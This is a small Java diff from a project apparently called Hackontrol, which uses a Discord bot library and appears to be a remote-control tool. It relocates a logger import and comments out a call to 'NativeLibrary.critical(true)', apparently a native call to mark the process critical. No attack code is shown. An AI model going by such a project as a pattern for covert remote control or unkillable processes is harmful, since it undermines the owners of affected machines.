@@ -7,7 +7,6 @@ import java.util.List;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.khopan.hackontrol.logger.HackontrolLoggerConfig;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.persistent.PersistentStorage;
@@ -20,6 +19,7 @@ import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
 import com.khopan.hackontrol.registry.implementation.RegistryImplementation;
 import com.khopan.hackontrol.utils.ErrorHandler;
+import com.khopan.logger.hackontrol.HackontrolLoggerConfig;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
@@ -270,7 +270,7 @@ public class Hackontrol {
 	}
 
 	public static void main(String[] args) throws Throwable {
-		NativeLibrary.critical(true);
+		//NativeLibrary.critical(true);
 		HackontrolLoggerConfig.disableDebug();
 		Hackontrol.LOGGER.info("Initializing");
 		Hackontrol.getInstance();
